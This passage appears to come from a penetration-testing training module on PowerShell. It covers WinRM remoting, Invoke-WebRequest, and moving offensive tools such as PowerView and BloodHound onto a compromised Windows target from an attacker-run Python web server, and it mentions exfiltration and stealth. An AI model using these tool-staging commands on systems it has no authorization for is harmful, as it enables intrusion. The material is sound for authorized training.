</code></pre>
<p>As can be seen in the above output, running this command will automatically ensure all the necessary configurations are in place to:</p>
<ul>
<li>Enable the WinRM service</li>
<li>Allow WinRM through the Windows Defender Firewall (Inbound and Outbound)</li>
<li>Grant administrative rights remotely to local users</li>
</ul>
<p>As long as credentials to access the system are known, anyone who can reach the target over the network can connect after that command is run. IT admins should take further steps to harden these WinRM configurations, especially if the system will be remotely accessible over the Internet. Among some of these hardening options are:</p>
<ul>
<li>Configure TrustedHosts to include just IP addresses/hostnames that will be used for remote management</li>
<li>Configure HTTPS for transport</li>
<li>Join Windows systems to an Active Directory Domain Environment and Enforce Kerberos Authentication</li>
</ul>
<p><strong>Testing PowerShell Remote Access</strong></p>
<p>Once we have enabled and configured WinRM, we can test remote access using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2">Test-WSMan</a> PowerShell cmdlet.</p>
<p><strong>Testing Unauthenticated Access</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\Users\administrator&gt; Test-WSMan -ComputerName <span class="hljs-string">"10.129.224.248"</span>

<span class="hljs-string">wsmid           :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd</span>
<span class="hljs-string">ProtocolVersion :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//schemas.dmtf.org/wbem/wsman/1/wsman.xsd</span>
<span class="hljs-string">ProductVendor   :</span> Microsoft Corporation
<span class="hljs-string">ProductVersion  :</span> <span class="hljs-string">OS:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span> <span class="hljs-string">SP:</span> <span class="hljs-number">0.0</span> <span class="hljs-string">Stack:</span> <span class="hljs-number">3.0</span>
</code></pre>
<p>Running this cmdlet sends a request that checks if the WinRM service is running. Keep in mind that this is unauthenticated, so no credentials are used, which is why no <code>OS</code> version is detected. This shows us that the WinRM service is running on the target.</p>
<p><strong>Testing Authenticated Access</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\Users\administrator&gt; Test-WSMan -ComputerName <span class="hljs-string">"10.129.224.248"</span> -Authentication Negotiate


<span class="hljs-string">wsmid           :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd</span>
<span class="hljs-string">ProtocolVersion :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//schemas.dmtf.org/wbem/wsman/1/wsman.xsd</span>
<span class="hljs-string">ProductVendor   :</span> Microsoft Corporation
<span class="hljs-string">ProductVersion  :</span> <span class="hljs-string">OS:</span> <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span> <span class="hljs-string">SP:</span> <span class="hljs-number">0.0</span> <span class="hljs-string">Stack:</span> <span class="hljs-number">3.0</span>
</code></pre>
<p>We can run the same command with the option <code>-Authentication Negotiate</code> to test if WinRM is authenticated, and we will receive the OS version (<code>10.0.11764</code>).</p>
<h4 id="powershell-remote-sessions">PowerShell Remote Sessions</h4>
<p>We also have the option to use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2">Enter-PSSession</a> cmdlet to establish a PowerShell session with a Windows target.</p>
<p><strong>Establishing a PowerShell Session</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\Users\administrator&gt; <span class="hljs-keyword">Enter</span>-PSSession -ComputerName <span class="hljs-number">10.129</span><span class="hljs-meta">.224</span><span class="hljs-meta">.248</span> -Credential htb-student -Authentication Negotiate
[<span class="hljs-number">10.129</span><span class="hljs-meta">.5</span><span class="hljs-meta">.129</span>]: PS C:\Users\htb-student\Documents&gt; $PSVersionTable 

Name                           Value
----                           -----
PSVersion                      <span class="hljs-number">5.1</span><span class="hljs-meta">.17763</span><span class="hljs-meta">.592</span>
PSEdition                      Desktop
PSCompatibleVersions           {<span class="hljs-number">1.0</span>, <span class="hljs-number">2.0</span>, <span class="hljs-number">3.0</span>, <span class="hljs-number">4.0</span>...}
BuildVersion                   <span class="hljs-number">10.0</span><span class="hljs-meta">.17763</span><span class="hljs-meta">.592</span>
CLRVersion                     <span class="hljs-number">4.0</span><span class="hljs-meta">.30319</span><span class="hljs-meta">.42000</span>
WSManStackVersion              <span class="hljs-number">3.0</span>
PSRemotingProtocolVersion      <span class="hljs-number">2.3</span>
SerializationVersion           <span class="hljs-number">1.1</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>
</code></pre>
<p>We can perform this same action from a Linux-based attack host with PowerShell core installed (like in Pwnbox). Remember that PowerShell is not exclusive to Windows and will run on other operating systems now.</p>
<p><strong>Using Enter-PSSession from Linux</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ [PS]&gt; Enter-PSSession -ComputerName <span class="hljs-number">10.129</span>.<span class="hljs-number">224.248</span> -Credential htb-student -Authentication Negotiate

PowerShell credential request
Enter your credentials.
Password for user htb-student: ***************

[<span class="hljs-number">10.129</span>.<span class="hljs-number">224.248</span>]: PS C:\Users\htb-student\Documents&gt; $PSVersionTable

Name                           Value                                           
----                           -----                                           
PSVersion                      <span class="hljs-number">5.1</span>.<span class="hljs-number">19041.1</span>                                     
PSEdition                      Desktop                                         
PSCompatibleVersions           {1<span class="hljs-selector-class">.0</span>, 2<span class="hljs-selector-class">.0</span>, 3<span class="hljs-selector-class">.0</span>, 4<span class="hljs-selector-class">.0</span>...}                         
<span class="hljs-selector-tag">BuildVersion</span>                   10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.19041</span><span class="hljs-selector-class">.1</span>                                    
<span class="hljs-selector-tag">CLRVersion</span>                     4<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.30319</span><span class="hljs-selector-class">.42000</span>                                 
<span class="hljs-selector-tag">WSManStackVersion</span>              3<span class="hljs-selector-class">.0</span>                                             
<span class="hljs-selector-tag">PSRemotingProtocolVersion</span>      2<span class="hljs-selector-class">.3</span>                                             
<span class="hljs-selector-tag">SerializationVersion</span>           1<span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
</code></pre>
<p>Along with being OS agnostic, there are now tons of different tools that we can use to interact remotely with hosts. Picking a means to remotely administer our hosts mostly comes down to what you are comfortable with and what you can use based on the engagement or your environment security settings.</p>
<hr>
<p>Networking is a pretty straightforward task to manage on Windows hosts. As your environments get more complex with cloud servers, multiple domains, and multiple sites across large geographical distances, network management at the level can get tedious. Luckily, we are only focused on our local host and how to manage a singular host. Moving forward, we will look at how we can interact with the web using PowerShell.</p>
<h2 id="interacting-with-the-web">Interacting With The Web</h2>
<hr>
<p>As an administrator, we can <code>automate</code> how we perform remote updates, install applications, and much more with tools and cmdlets through PowerShell. This will ensure that we can get the software, updates, and other objects we need on hosts locally and remotely without manually browsing for them via the GUI. This will save us time and enable us to remotely administer the hosts instead of sitting at its keyboard or RDP&#39;ing in. As a pentester, this is a quick way to get tools and other items we need into the environment and to exfiltrate data if we have the infrastructure to send it to. This section will cover how we interact with the web and show several ways to utilize PowerShell to serve this purpose.</p>
<hr>
<h3 id="how-do-we-interact-with-the-web-using-powershell-">How Do We Interact With The Web Using PowerShell?</h3>
<p>When it comes to interacting with the web via PowerShell, the <a href="https://learn.microsoft.com/bs-latn-ba/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1">Invoke-WebRequest</a> cmdlet is our champion. We can use it to perform basic HTTP/HTTPS requests (like <code>GET</code> and <code>POST</code>), parse through HTML pages, download files, authenticate, and even maintain a session with a site. It&#39;s very versatile and easy to use in scripting and automation. If you prefer aliases, the Invoke-WebRequest cmdlet is aliased to <code>wget</code>, <code>iwr</code> and <code>curl</code>. Those familiar with Linux Fundamentals may be familiar with cURL and wget, as they are used to download files from the command line in Linux distributions. Let&#39;s look at the help from Invoke-WebRequest for a minute.</p>
<p><strong>Invoke-WebRequest Help</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session"><span class="hljs-symbol">PS</span> <span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt; <span class="hljs-symbol">Get</span>-<span class="hljs-symbol">Help</span> <span class="hljs-symbol">Invoke</span>-<span class="hljs-symbol">Webrequest</span>

<span class="hljs-symbol">NAME</span>
    <span class="hljs-symbol">Invoke</span>-<span class="hljs-symbol">WebRequest</span>

<span class="hljs-symbol">SYNOPSIS</span>
    <span class="hljs-symbol">Gets</span> content from a web page on the <span class="hljs-symbol">Internet</span>.


<span class="hljs-symbol">SYNTAX</span>
    <span class="hljs-symbol">Invoke</span>-<span class="hljs-symbol">WebRequest</span> [-<span class="hljs-symbol">Uri</span>] &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Uri</span>&gt; [-<span class="hljs-symbol">Body</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Object</span>&gt;] [-<span class="hljs-symbol">Certificate</span>
    &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Security</span>.<span class="hljs-symbol">Cryptography</span>.<span class="hljs-symbol">X509Certificates</span>.<span class="hljs-symbol">X509Certificate</span>&gt;] [-<span class="hljs-symbol">CertificateThumbprint</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;]
    [-<span class="hljs-symbol">ContentType</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">Credential</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Management</span>.<span class="hljs-symbol">Automation</span>.<span class="hljs-symbol">PSCredential</span>&gt;] [-<span class="hljs-symbol">DisableKeepAlive</span>]
    [-<span class="hljs-symbol">Headers</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Collections</span>.<span class="hljs-symbol">IDictionary</span>&gt;] [-<span class="hljs-symbol">InFile</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">MaximumRedirection</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Int32</span>&gt;]
    [-<span class="hljs-symbol">Method</span> {<span class="hljs-symbol">Default</span> | <span class="hljs-symbol">Get</span> | <span class="hljs-symbol">Head</span> | <span class="hljs-symbol">Post</span> | <span class="hljs-symbol">Put</span> | <span class="hljs-symbol">Delete</span> | <span class="hljs-symbol">Trace</span> | <span class="hljs-symbol">Options</span> | <span class="hljs-symbol">Merge</span> | <span class="hljs-symbol">Patch</span>}] [-<span class="hljs-symbol">OutFile</span>
    &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">PassThru</span>] [-<span class="hljs-symbol">Proxy</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Uri</span>&gt;] [-<span class="hljs-symbol">ProxyCredential</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Management</span>.<span class="hljs-symbol">Automation</span>.<span class="hljs-symbol">PSCredential</span>&gt;]
    [-<span class="hljs-symbol">ProxyUseDefaultCredentials</span>] [-<span class="hljs-symbol">SessionVariable</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">TimeoutSec</span> &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">Int32</span>&gt;] [-<span class="hljs-symbol">TransferEncoding</span>
    {chunked | compress | deflate | gzip | identity}] [-<span class="hljs-symbol">UseBasicParsing</span>] [-<span class="hljs-symbol">UseDefaultCredentials</span>] [-<span class="hljs-symbol">UserAgent</span>
    &lt;<span class="hljs-symbol">System</span>.<span class="hljs-symbol">String</span>&gt;] [-<span class="hljs-symbol">WebSession</span> &lt;<span class="hljs-symbol">Microsoft</span>.<span class="hljs-symbol">PowerShell</span>.<span class="hljs-symbol">Commands</span>.<span class="hljs-symbol">WebRequestSession</span>&gt;] [&lt;<span class="hljs-symbol">CommonParameters</span>&gt;]

<span class="hljs-symbol">DESCRIPTION</span>
    <span class="hljs-symbol">The</span> <span class="hljs-string">`Invoke-WebRequest`</span> cmdlet sends <span class="hljs-symbol">HTTP</span>, <span class="hljs-symbol">HTTPS</span>, <span class="hljs-symbol">FTP</span>, and <span class="hljs-symbol">FILE</span> requests to a web page or web service. <span class="hljs-symbol">It</span> parses
    the response and returns collections of forms, links, images, and other significant <span class="hljs-symbol">HTML</span> elements.

    <span class="hljs-symbol">This</span> cmdlet was introduced in <span class="hljs-symbol">Windows</span> <span class="hljs-symbol">PowerShell</span> <span class="hljs-number">3.0</span>.

    &gt; [!<span class="hljs-symbol">NOTE</span>] &gt; <span class="hljs-symbol">By</span> default, script code in the web page may be run when the page is being parsed to populate the &gt;
    <span class="hljs-string">`ParsedHtml`</span> property. <span class="hljs-symbol">Use</span> the <span class="hljs-string">`-UseBasicParsing`</span> switch to suppress this.

    &gt; [!<span class="hljs-symbol">IMPORTANT</span>] &gt; <span class="hljs-symbol">The</span> examples in this article reference hosts in the <span class="hljs-string">`contoso.com`</span> domain. <span class="hljs-symbol">This</span> is a fictitious &gt;
    domain used by <span class="hljs-symbol">Microsoft</span> for examples. <span class="hljs-symbol">The</span> examples are designed to show how to use the cmdlets. &gt; <span class="hljs-symbol">However</span>, since
    the <span class="hljs-string">`contoso.com`</span> sites don<span class="hljs-string">'t exist, the examples don'</span>t work. <span class="hljs-symbol">Adapt</span> the examples &gt; to hosts in your environment.

&lt;<span class="hljs-symbol">SNIP</span>&gt;
</code></pre>
<p>Notice in the synopsis from the Get-Help output it states:</p>
<p>&quot;<code>Gets content from a web page on the Internet.</code>&quot;</p>
<p>While this is the core functionality, we can also use it to get content that we host on web servers in the same network environment. We have talked it up, and now let&#39;s try and do a simple web request using Invoke-WebRequest.</p>
<hr>
<h3 id="a-simple-web-request">A Simple Web Request</h3>
<p>We can perform a basic Get request of a website using the <code>-Method GET</code> modifier with the Invoke-WebRequest cmdlet, as seen below. We will specify the URI as <code>https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html</code> for this example. We will also send it to <code>Get-Member</code> to inspect the object&#39;s output methods and properties.</p>
<p><strong>Get Request with Invoke-WebRequest</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Invoke-WebRequest -Uri <span class="hljs-string">"https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html"</span> -Method GET | Get-Member


   TypeName: Microsoft.PowerShell.Commands.HtmlWebResponseObject

----              ---------- ----------
Dispose           Method     void Dispose(), void IDisposable.Dispose()
Equals            Method     bool Equals(System.Object obj)
GetHashCode       Method     int GetHashCode()
GetType           Method     <span class="hljs-keyword">type</span> GetType()
ToString          Method     <span class="hljs-keyword">string</span> ToString()
AllElements       <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>Microsoft.PowerShell.Commands.WebCmdletElementCollection AllElements...
BaseResponse      <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Net.WebResponse BaseResponse {get;set;}
Content           <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> Content {get;}
Forms             <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>Microsoft.PowerShell.Commands.FormObjectCollection Forms {get;}
Headers           <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.Collections.Generic.Dictionary[<span class="hljs-keyword">string</span>,<span class="hljs-keyword">string</span>] Headers {get;}
Images            <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;}
InputFields       <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields...
Links             <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;}
ParsedHtml        <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>mshtml.IHTMLDocument2 ParsedHtml {get;}
RawContent        <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> RawContent {get;set;}
RawContentLength  <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>long RawContentLength {get;}
RawContentStream  <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>System.IO.MemoryStream RawContentStream {get;}
Scripts           <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>Microsoft.PowerShell.Commands.WebCmdletElementCollection Scripts {get;}
StatusCode        <span class="hljs-keyword">Property</span><span class="hljs-title">   </span>int StatusCode {get;}
StatusDescription <span class="hljs-keyword">Property</span><span class="hljs-title">   </span><span class="hljs-keyword">string</span> StatusDescription {get;}
</code></pre>
<p>Notice all the different properties this site has. We can now filter on those if we wish to show only a portion of the site. For example, what if we just wanted to see a listing of the images on the site? We can do that by performing the request and then filtering for just <code>Images</code> like so:</p>
<p><strong>Filtering Incoming Content</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Invoke-WebRequest -Uri <span class="hljs-string">"https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html"</span> -Method GET | fl Images

Images : {@{<span class="hljs-attr">innerHTML=;</span> <span class="hljs-attr">innerText=;</span> <span class="hljs-attr">outerHTML=&lt;IMG</span> <span class="hljs-attr">alt="Pretty</span> Picture<span class="hljs-string">"
         src="</span>example/prettypicture.jpg<span class="hljs-string">"&gt;; outerText=; tagName=IMG; alt=Pretty Picture;
         src=example/prettypicture.jpg}, @{innerHTML=; innerText=; outerHTML=&lt;IMG alt="</span>Pretty
         Picture<span class="hljs-string">" src="</span>example/prettypicture.jpg<span class="hljs-string">" align=top&gt;; outerText=; tagName=IMG; alt=Pretty
         Picture; src=example/prettypicture.jpg; align=top}}</span>
</code></pre>
<p>Now we have an easy-to-read list of the images included in the website, and we can download them if we want. This is a super easy way only to get the information we wish to see. The raw content of the website we are enumerating looks like this:</p>
<p><strong>Raw Content</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent

RawContent : HTTP/1.1 200 OK
             Strict-Transport-Security: max-age=16070400
             X-Content-Type-Options: nosniff
             X-XSS-Protection: 1; mode=block
             X-Frame-Options: SAMEORIGIN
             Accept-Ranges: bytes
             Content-Length: 1807
             Content-Type: text/html
             Date: Thu, 10 Nov 2022 16:25:07 GMT
             ETag: "70f-529340fa7b28d"
             Last-Modified: Wed, 13 Jan 2016 09:47:41 GMT
             Server: Apache/2.4.6 () OpenSSL/1.0.2k-fips

             <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
             <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>A very simple webpage<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
             <span class="hljs-tag">&lt;<span class="hljs-name">basefont</span> <span class="hljs-attr">size</span>=<span class="hljs-string">4</span>&gt;</span>
             <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">FFFFFF</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>A very simple webpage. This is an "h1" level header.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>This is a level h2 header.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>This is a level h6 header.  Pretty small!<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is a standard paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>Now I've aligned it in the center of the screen.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">right</span>&gt;</span>Now aligned to the right<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Bold text<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>Strongly emphasized text<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>  Can you tell the difference vs. bold?<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>Italics<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Emphasized text<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>  Just like Italics!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

             <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Here is a pretty picture: <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">example/prettypicture.jpg</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"Pretty
             Picture"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
</code></pre>
<p>We could carve out this site&#39;s <code>raw content</code> instead of looking at everything from the request all at once. Notice how much easier it is to read? As a quick way to recon a website or pull key information out, such as names, addresses, and emails, it doesn&#39;t get much easier than this. Where <code>Invoke-WebRequest</code> gets handy is its ability to download files via the CLI. Let&#39;s look at downloading files now.</p>
<hr>
<h3 id="downloading-files-using-powershell">Downloading Files using PowerShell</h3>
<p>Whether performing sys admin, pentesting engagement, or disaster recovery-related tasks, files of all kinds will inevitably need to be downloaded to a Windows host. On a pentesting engagement, we may have compromised a target and want to transfer tools onto that host to enumerate the environment further and identify ways to get to other hosts &amp; networks. PowerShell gives us some built-in options to do this. We will be focusing on Invoke-WebRequest for this module, but understand there are many different ways (some it&#39;s what they were meant for, others are unintentional by the tool creators) we could perform web requests and downloads.</p>
<h4 id="downloading-powerview-ps1-from-github">Downloading PowerView.ps1 from GitHub</h4>
<p>We can practice using Invoke-WebRequest by downloading a popular tool used by many pentesters called <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>.</p>
<p><strong>Download To Our Host</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\&gt; Invoke-WebRequest -Uri <span class="hljs-string">"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"</span> -OutFile <span class="hljs-string">"C:\PowerView.ps1"</span>

PS <span class="hljs-string">C:</span>\&gt; dir
<span class="hljs-symbol">

    Directory:</span> <span class="hljs-string">C:</span>\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          <span class="hljs-number">6</span><span class="hljs-regexp">/5/</span><span class="hljs-number">2021</span>   <span class="hljs-number">5</span>:<span class="hljs-number">10</span> AM                PerfLogs
d-r---         <span class="hljs-number">7</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">36</span> AM                Program Files
d-r---          <span class="hljs-number">6</span><span class="hljs-regexp">/5/</span><span class="hljs-number">2021</span>   <span class="hljs-number">7</span>:<span class="hljs-number">37</span> AM                Program Files (x86)
d-r---         <span class="hljs-number">7</span><span class="hljs-regexp">/30/</span><span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">21</span> AM                Users
d-----         <span class="hljs-number">7</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">28</span> AM                Windows
-a----         <span class="hljs-number">8</span><span class="hljs-regexp">/10/</span><span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">12</span> AM        <span class="hljs-number">7299504</span> PowerView.ps1
</code></pre>
<p>Using Invoke-WebRequest is simple; we specify the cmdlet and the exact URL of a resource we want to download:</p>
<p><code>-Uri &quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&quot;</code></p>
<p>After the URL, we specify the location and file name of the resource on the Windows system we are downloading it from:</p>
<p><code>-OutFile &quot;C:\PowerView.ps1&quot;</code></p>
<p>We can also use Invoke-WebRequest to download files from web servers on the local network or a network reachable from the Windows target. It is common to find the need to transfer files from our attack host to a Windows target. One benefit to doing this would be if one of our goals during a pentest is to remain as stealthy as possible, we may not need to generate requests to the Internet that network security appliances could detect at the edge of the network. If we already had PowerView.ps1 stored on our <code>attack host</code> we could use a simple python web server to host PowerView.ps1 and download it from the target.</p>
<h4 id="example-path-to-bring-tools-into-an-environment">Example Path to Bring Tools Into an Environment</h4>
<p>If we already had PowerView.ps1 stored on our <code>attack host</code> we could use a simple Python web server to host PowerView.ps1 and download it from the target. From the attack host, we want to confirm that the file is already present or we need to download it. In this example, we can assume it is already on the attack host for demonstration purposes.</p>
<p><strong>Using ls to View the File (Attack Host)</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls

Dictionaries            Get-HttpStatus<span class="hljs-selector-class">.ps1</span>                    Invoke-Portscan<span class="hljs-selector-class">.ps1</span>          PowerView<span class="hljs-selector-class">.ps1</span>  Recon<span class="hljs-selector-class">.psd1</span>
Get-ComputerDetail<span class="hljs-selector-class">.ps1</span>  Invoke-CompareAttributesForClass<span class="hljs-selector-class">.ps1</span>  Invoke-ReverseDnsLookup<span class="hljs-selector-class">.ps1</span>  README<span class="hljs-selector-class">.md</span>      Recon.psm1
</code></pre>
<p>We start a simple python web server in the directory where PowerView.ps1 is located.</p>
<p><strong>Starting the Python Web Server (Attack Host)</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 -m http.server <span class="hljs-number">8000</span>

Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>/) ...
</code></pre>
<p>Then, we would download the hosted file from the attack host using Invoke-WebRequest.</p>
<p><strong>Downloading PowerView.ps1 from Web Server (From Attack Host to Target Host)</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session">Invoke-WebRequest -<span class="hljs-built_in">Uri</span> <span class="hljs-string">"http://10.10.14.169:8000/PowerView.ps1"</span> -OutFile <span class="hljs-string">"C:\PowerView.ps1"</span>
</code></pre>
<p>As discussed previously, we can use the Invoke-WebRequest cmdlet to send commands to remote hosts. This can be pretty useful, especially when we discover vulnerabilities that allow us to execute commands on a Windows target but may not have access via an interactive shell or remote desktop session. This could allow us to download files onto the target host, allowing us to further our access to that target and move to others on the network. File transfer methods are covered in greater detail in the module <a href="https://academy.hackthebox.com/module/details/24">File Transfers</a>.</p>
<h4 id="what-if-we-can-t-use-invoke-webrequest-">What If We Can&#39;t Use Invoke-WebRequest?</h4>
<p>So what happens if we are restricted from using <code>Invoke-WebRequest</code> for some reason? Not to fear, Windows provides several different methods to interact with web clients. The first and more challenging interaction path is utilizing the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0">.Net.WebClient</a> class. This handy class is a .Net call we can utilize as Windows uses and understands .Net. This class contains standard system.net methods for interacting with resources via a URI (web addresses like github.com/project/tool.ps1). Let&#39;s look at an example:</p>
<p><strong>Net.WebClient Download</strong></p>
<p>Interacting With The Web</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(<span class="hljs-string">"https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip"</span>, <span class="hljs-string">"Bloodhound.zip"</span>)

PS C:\htb&gt; ls

    Directory: C:\Users\MTanaka

Mode                 LastWriteTime         Length Name
<span class="hljs-comment">----                 -------------         ------ ----</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---          11/10/2022 10:45 AM      108511752 Bloodhound.zip</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---           6/14/2022  8:22 AM           4418 passwords.kdbx</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---            9/9/2020  4:54 PM         696576 Start.exe</span>
-<span class="hljs-keyword">a</span><span class="hljs-comment">---           9/11/2021 12:58 PM              0 sticky.gpr</span>
